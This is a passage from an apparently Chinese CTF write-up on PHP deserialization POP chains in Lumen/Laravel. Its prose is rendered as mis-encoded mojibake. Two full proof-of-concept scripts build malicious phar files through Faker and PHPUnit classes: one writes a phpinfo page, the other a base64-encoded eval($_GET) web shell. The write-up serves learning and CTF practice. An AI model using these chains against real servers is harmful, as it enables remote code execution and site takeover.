class="keyword">$this</span>-&gt;extensions[$rule];</span><br><span class="line"><span class="comment">// ä¹‹å‰chainä¸­å†™çš„æ˜¯$this-&gt;extensions = ['' =&gt; $function];æ‰€ä»¥æ­¤å¤„çš„$callback=$function</span></span><br><span class="line">    <span class="keyword">if</span> (is_callable($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array($callback, $parameters);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_string($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;callClassBasedExtension($callback, $parameters);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™å››ç§chainçš„åˆ†æå¯ä»¥å‚è€ƒ<a href="https://www.anquanke.com/post/id/170681" target="_blank" rel="noopener">ã€ŠPHPååºåˆ—åŒ–å…¥é—¨ä¹‹å¯»æ‰¾POPé“¾(ä¸€)ã€‹</a><br>PS:ä½†æ˜¯æ–‡ä¸­å¯¹ç¬¬ä¸‰ç§çš„åˆ†æå­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒæˆ‘çš„è¡¨è¿°</p><h4 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>æ€»ç»“èµ·æ¥ä»¥ä¸Šå››ç§ç±»å‹è¦ä¹ˆæ˜¯åˆ©ç”¨è°ƒç”¨<code>dispatch</code>æ¥å®Œæˆï¼Œè¦ä¹ˆæ˜¯åˆ©ç”¨<code>$this-&gt;events</code>ä¸­çš„<code>__call</code>å®Œæˆã€‚</p><h3 id="3-POP-chainçš„æ„é€ "><a href="#3-POP-chainçš„æ„é€ " class="headerlink" title="3. POP chainçš„æ„é€ "></a>3. POP chainçš„æ„é€ </h3><p>pop chainçš„æ„é€ ä¸€èˆ¬éƒ½æ˜¯ä»å¯»æ‰¾<code>__wakeup</code> æˆ–è€… <code>__destruct</code>å¼€å§‹çš„<br>å¯»æ‰¾æ€è·¯: </p><ol><li>æ‰¾<code>dispatch</code>å®Œæˆåˆé€‚çš„å‡½æ•°è°ƒç”¨</li><li><p>å¯»æ‰¾åˆé€‚çš„<code>$this-&gt;events</code>æ¥ä½¿ç”¨å…¶ä¸­çš„<code>__call</code></p><h4 id="chain-1"><a href="#chain-1" class="headerlink" title="chain 1"></a>chain 1</h4></li><li><p>å…¥å£ç‚¹  cat/vendor/illuminate/broadcasting/PendingBroadcast.php <code>__destruct()</code></p></li><li>cat/vendor/fzaninotto/faker/src/Faker/ValidGenerator.php <code>__call($name, $arguments)</code><br>åœ¨è¿™å…¶ä¸­call_user_func_arrayå‡½æ•°çš„è¿”å›ç»“æœä½œä¸ºcall_user_funcå‡½æ•°çš„å‚æ•°ï¼Œ$this-&gt;validatoråˆæ˜¯å¯æ§çš„ï¼Œè¿›è€Œcall_user_funcå‡½æ•°çš„å‚æ•°å‡æ˜¯å¯æ§çš„ã€‚ä½†æ˜¯æƒ³ç”¨file_put_contentså‡½æ•°æ¥å†™shelléœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œæ‰€ä»¥call_user_funcä¸èƒ½å¤Ÿç›´æ¥ä½¿ç”¨ï¼Œéœ€è¦ç»§ç»­å¯»æ‰¾ä¸€ä¸ªcall_user_func_arrayå‡½æ•°æ¥ç”¨</li><li>cat/vendor/phpunit/phpunit/src/Framework/MockObject/Stub/ReturnCallback.php <code>invoke(Invocation $invocation)</code>å‡½æ•°å­˜åœ¨ä¸€ä¸ªcall_user_func_arrayå‡½æ•°ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œç¬¬äºŒä¸ªå‚æ•°éœ€è¦Invocationå¯¹è±¡</li><li>cat/vendor/phpunit/phpunit/src/Framework/MockObject/Invocation/StaticInvocation.php ä¸­æ‰¾åˆ°å¯¹æ¥å£<code>Invocation</code>çš„å®ç°</li></ol><p>æœ€ç»ˆæ„é€ å‡ºçš„pocå¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">   <span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">       <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">       <span class="keyword">protected</span> $event;</span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">   <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">       <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">ValidGenerator</span></span>&#123;</span><br><span class="line">       <span class="keyword">protected</span> $generator;</span><br><span class="line">       <span class="keyword">protected</span> $validator;</span><br><span class="line">       <span class="keyword">protected</span> $maxRetries;</span><br><span class="line">       <span class="comment">// __callæ–¹æ³•ä¸­æœ‰call_user_func_arrayã€call_user_func</span></span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($generator, $validator = null, $maxRetries = <span class="number">10000</span>)</span></span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;generator = $generator;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;validator = $validator;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;maxRetries = $maxRetries;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Stub</span>&#123;</span><br><span class="line">   <span class="title">class</span> <span class="title">ReturnCallback</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="title">private</span> $<span class="title">callback</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($callback)</span></span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>&#123;</span><br><span class="line">   <span class="title">class</span> <span class="title">StaticInvocation</span>&#123;</span><br><span class="line">       <span class="title">private</span> $<span class="title">parameters</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parameters)</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">   $function = 'file_put_contents';</span><br><span class="line">   $parameters = <span class="keyword">array</span>(<span class="string">'/var/www/html/11.php'</span>,<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">   $staticinvocation = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);</span><br><span class="line">   $returncallback = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback($function);</span><br><span class="line">   $defaultgenerator = <span class="keyword">new</span> Faker\DefaultGenerator($staticinvocation);</span><br><span class="line">   $validgenerator = <span class="keyword">new</span> Faker\ValidGenerator($defaultgenerator,<span class="keyword">array</span>($returncallback,<span class="string">'invoke'</span>),<span class="number">2</span>);</span><br><span class="line">   $pendingbroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($validgenerator,<span class="number">123</span>);</span><br><span class="line">   $o = $pendingbroadcast;</span><br><span class="line">   $filename = <span class="string">'poc.phar'</span>;<span class="comment">// åç¼€å¿…é¡»ä¸ºpharï¼Œå¦åˆ™ç¨‹åºæ— æ³•è¿è¡Œ</span></span><br><span class="line">   file_exists($filename) ? unlink($filename) : <span class="keyword">null</span>;</span><br><span class="line">   $phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">   $phar-&gt;startBuffering();</span><br><span class="line">   $phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">   $phar-&gt;setMetadata($o);</span><br><span class="line">   $phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);</span><br><span class="line">   $phar-&gt;stopBuffering();</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>pocæ‰§è¡Œè¿‡ç¨‹åˆ†æ</p><ol><li><p>èµ·å§‹ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$validgenerator = <span class="keyword">new</span> Faker\ValidGenerator($defaultgenerator,<span class="keyword">array</span>($returncallback,<span class="string">'invoke'</span>),<span class="number">2</span>);</span><br><span class="line">$pendingbroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($validgenerator,<span class="number">123</span>);</span><br></pre></td></tr></table></figure></li><li><p>å¯ä»¥çœ‹åˆ°é¦–å…ˆä¹Ÿæ˜¯è¿›å…¥åˆ°äº†<strong>destruct()ï¼Œå°†dispatchä½œä¸ºå‡½æ•°è°ƒç”¨è¿›è¡Œäº†ä½¿ç”¨ï¼Œä½†æ˜¯ValidGeneratorç±»ä¸­æ²¡æœ‰è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥å°±è°ƒç”¨</strong>callï¼Œå‚æ•°ä¸ºdsipatchå’Œ123ã€‚æ­¤å¤„è¦æ³¨æ„åˆ°ValidGeneratorçš„å‡ ä¸ªå‚æ•°åˆ†åˆ«æ˜¯<code>$defaultgenerator,array($returncallback,&#39;invoke&#39;),2</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$parameters = <span class="keyword">array</span>(<span class="string">'/var/www/html/11.php'</span>,<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">$staticinvocation = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);</span><br><span class="line">$defaultgenerator = <span class="keyword">new</span> Faker\DefaultGenerator($staticinvocation);</span><br></pre></td></tr></table></figure></li></ol><p>å› æ­¤ä¸‹é¢è¿™å¥ä¸­çš„<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res = call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;generator, $name), $arguments);</span><br></pre></td></tr></table></figure></p><p><code>array($this-&gt;generator, $name)</code>å®é™…ä¸Šå°±æ˜¯æ‰§è¡Œäº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Faker\DefaultGenerator($staticinvocation)-&gt;dispatch</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯DefaultGeneratorä¸­ä¹Ÿæ²¡æœ‰dispatchå‡½æ•°å—ï¼Œå› æ­¤å°±è°ƒç”¨<strong>callå‡½æ•°æ¥å¤„ç†ï¼Œä»–çš„</strong>callå‡½æ•°æ˜¯ç›´æ¥å°†$staticinvocationçš„å€¼è¿›è¡Œè¿”å›</p><ol start="3"><li><code>new PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);</code> æ˜¯ä¸€ä¸ªå®ä¾‹åŒ–åçš„Invocationå¯¹è±¡ï¼Œå¹¶ä¸”å®ƒå¯ä»¥ç»™å‡ºæˆ‘ä»¬éœ€è¦å‚æ•°arrayï¼Œä¹Ÿå°±æ˜¯<code>$res = è¿™ä¸ªå¯¹è±¡</code></li><li>æ¥ä¸‹æ¥å›åˆ°$validgenerator = new Faker\ValidGenerator($defaultgenerator,array($returncallback,â€™invokeâ€™),2);ç»§ç»­çœ‹å…¶ä¸­çš„<code>call_user_func($this-&gt;validator, $res)</code>è¿™é‡Œçš„<code>$this-&gt;validator</code>å…¶å®å°±æ˜¯<code>array($returncallback,&#39;invoke&#39;)</code>ï¼Œæ•´ä½“å¯¹åº”çš„å«ä¹‰å¦‚ä¸‹<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback($function)-&gt;invoke($res);</span><br></pre></td></tr></table></figure></li></ol><p>invokeçš„å‡½æ•°å®šä¹‰å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invoke</span><span class="params">(Invocation $invocation)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> \call_user_func_array(<span class="keyword">$this</span>-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°$reså˜é‡æ‰€å¯¹åº”çš„å¯¹è±¡åœ¨æ­¤å¤„å°†å–å‡ºæˆ‘ä»¬éœ€è¦çš„$parametersï¼Œè€Œ$this-&gt;callbackå°±æ˜¯æˆ‘ä»¬ä¹‹å‰è®¾ç½®çš„$function</p><h4 id="chain-2"><a href="#chain-2" class="headerlink" title="chain 2"></a>chain 2</h4><p>è¿™ä¸ªpop chainå‡ºè‡ªlemonå¸ˆå‚…ï¼Œåªè¿™æ¡ç›¸è¾ƒäºä¸Šæ¡ç­”é¢˜ç›¸åŒä½†æ˜¯æ¯”è¾ƒç»•ï¼Œæˆ‘åœ¨æ³¨é‡Šå·²ç»åšäº†è¯¦ç»†çš„è§£é‡Šã€‚<br>å‚è€ƒ:<br><a href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#%E5%AF%BB%E6%89%BEPOP-Chain" target="_blank" rel="noopener">ã€Šlumenserialâ€“kingkkã€‹</a><br><a href="https://www.cnblogs.com/iamstudy/articles/code_breaking_lumenserial_writeup.html#_label0" target="_blank" rel="noopener">ã€Šlumenserial-l3m0nã€‹</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($forma)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $forma;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ValidGenerator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $generator;</span><br><span class="line">        <span class="keyword">protected</span> $validator;</span><br><span class="line">        <span class="keyword">protected</span> $maxRetries;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($generator, $validator, $maxRetries = <span class="number">10000</span>)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;generator = $generator;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;validator = $validator;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;maxRetries = $maxRetries;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">StaticInvocation</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>($<span class="title">parameters</span>)&#123;</span><br><span class="line">            $<span class="title">this</span>-&gt;<span class="title">parameters</span> = $<span class="title">parameters</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Stub</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ReturnCallback</span>&#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>($<span class="title">callback</span>)&#123;</span><br><span class="line">            $<span class="title">this</span>-&gt;<span class="title">callback</span> = $<span class="title">callback</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># exp func call</span></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">function</span> = "<span class="title">file_put_contents</span>";</span><br><span class="line">    $parameters = [<span class="string">"/var/www/html/upload/z.php"</span>, base64_decode(<span class="string">"PD9waHAgZXZhbCgkX0dFVFsnMTEnXSk7Pz4="</span>)];</span><br><span class="line">    </span><br><span class="line">    $exp_call_obj = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback($function);</span><br><span class="line"></span><br><span class="line">    $exp_args_obj = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);</span><br><span class="line">    $tmp_arr = [<span class="string">"gogogo"</span> =&gt; $exp_args_obj];</span><br><span class="line">    $s4_obj = <span class="keyword">new</span> Faker\Generator($tmp_arr);</span><br><span class="line">    <span class="comment">// ç¬¬ä¸€æ¬¡ä½¿ç”¨Generatoræ¥å¾—åˆ°dispatchå¯¹åº”çš„å†…å®¹</span></span><br><span class="line">    $get_func_arr = <span class="keyword">array</span>(<span class="string">"dispatch"</span>=&gt; <span class="keyword">array</span>($s4_obj, <span class="string">"getFormatter"</span>));</span><br><span class="line">    <span class="comment">// æœ€ç»ˆå°†ä¼šè¿”å› array($s4_obj, "getFormatter")</span></span><br><span class="line">    $s3_obj = <span class="keyword">new</span> Faker\Generator($get_func_arr);</span><br><span class="line">    <span class="comment">// array($s4_obj, "getFormatter") è¿›å…¥format()ä¸­çš„call_user_func_array</span></span><br><span class="line">    <span class="comment">// å°±å¯ä»¥è¿”å›æˆ‘ä»¬gogogoæ‰€å¯¹åº”çš„$exp_args_obj</span></span><br><span class="line">    <span class="comment">// æœ€ç»ˆæˆ‘ä»¬éœ€è¦çš„$exp_args_objå°†ä¼šè¿”å›ç»™$res</span></span><br><span class="line">    <span class="comment">// ä¹‹å$reså†invoke()ä¸­å¯ä»¥é€šè¿‡$invocation-&gt;getParameters()å°†$parameterså–å‡º</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// $s3_objå¯¹åº”generatoræ˜¯æˆ‘ä»¬éœ€è¦æ§åˆ¶çš„ç±»ï¼Œè€Œè¿™ä¸ªç±»ä¸­æœ‰æˆ‘ä»¬ç”¨æ¥æ§åˆ¶$reså˜é‡çš„å‡½æ•°</span></span><br><span class="line">    <span class="comment">// array($exp_call_obj,"invoke")ä¼šåœ¨ValidGeneratorä¸­çš„call_user_funcå¤„è°ƒç”¨invokeå‡½æ•°</span></span><br><span class="line">    $s2_obj = <span class="keyword">new</span> Faker\ValidGenerator($s3_obj, <span class="keyword">array</span>($exp_call_obj,<span class="string">"invoke"</span>), <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    $s1_obj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($s2_obj, <span class="string">"gogogo"</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($s1_obj)).<span class="string">"\n\r\n\r"</span>;</span><br><span class="line">    </span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">'./z.phar'</span>, <span class="number">0</span>);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">    $p-&gt;setMetadata($s1_obj);</span><br><span class="line">    $p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>åœ¨æ­¤å¤§è‡´åšä¸ªå°ç»“ï¼š</p><ol><li>é¦–å…ˆï¼Œæ­¤å¤„ç¦ç”¨äº†ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½rceåªèƒ½æƒ³åŠæ³•getshellï¼Œå†™shellå°±è¦ç”¨<code>file_put_contents</code>å‡½æ•°ï¼Œæ­¤æ—¶å°±æ¶‰åŠä¸¤ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å°±å¿…é¡»æ‰¾<code>call_user_func_array</code>è¿™æ ·çš„å‡½æ•°æ¥è¿›è¡Œè°ƒç”¨ã€‚</li><li>pop chainçš„æ„é€ å¯¹äºæ¡†æ¶è€Œè¨€æ˜¯æ‰¾åˆ°ä¸€ä¸ªå¥½çš„èµ·å§‹ç‚¹ï¼Œä¸€èˆ¬è€Œè¨€æ˜¯æ‰¾<code>__wakeup</code>å’Œ<code>__destruct</code>ï¼Œä½†æ˜¯æ¡†æ¶çš„èµ·å§‹ç‚¹å’Œæ„é€ æ€æƒ³å¯ä»¥å‚è€ƒphpggcã€‚å¯¹ä¸laravelæ¡†æ¶è€Œè¨€ï¼Œå°±æ˜¯çœ‹ä½¿ç”¨<code>dispatch</code>è¿˜æ˜¯ä½¿ç”¨<code>__call</code>(é€‰æ‹©çš„ä¾æ®å°±æ˜¯è¿™ä¸¤è€…ä¸­ä¼šä¸ä¼šæ¶‰åŠåˆ°<code>call_user_func_array</code>)ã€‚</li></ol><h4 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h4><p>åœ¨åšæ­¤é¢˜ç›®çš„æ—¶å€™ä¹‹æ‰€ä»¥ä¼šæƒ³åˆ°æ˜¯ååºåˆ—æ¼æ´æ˜¯çœ‹å¦‚ä¸‹ä¿¡æ¯:</p><ol><li><p>é¦–å…ˆçœ‹æ¡†æ¶çš„è·¯ç”±</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$router-&gt;get(<span class="string">'/server/editor'</span>, <span class="string">'EditorController@main'</span>);</span><br><span class="line">$router-&gt;post(<span class="string">'/server/editor'</span>, <span class="string">'EditorController@main'</span>);</span><br></pre></td></tr></table></figure></li><li><p>å…¶æ¬¡æ ¹æ®è·¯ç”±çœ‹<code>Controller</code>ï¼Œå¹¶åœ¨<code>Controller</code>ä¸­å¯»æ‰¾æ•æ„Ÿç‚¹ï¼Œæ¯”å¦‚æ­¤å¤„çš„<code>download</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    $content = file_get_contents($url);</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹urlå‚æ•°æ˜¯å¦å¯æ§ï¼Œæ˜¯å¦è¿‡æ»¤ï¼Œé‚£ä¹ˆå°±æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">doCatchimage</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sources = $request-&gt;input(<span class="keyword">$this</span>-&gt;config[<span class="string">'catcherFieldName'</span>]);</span><br><span class="line">    $rets = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($sources) &#123;</span><br><span class="line">        <span 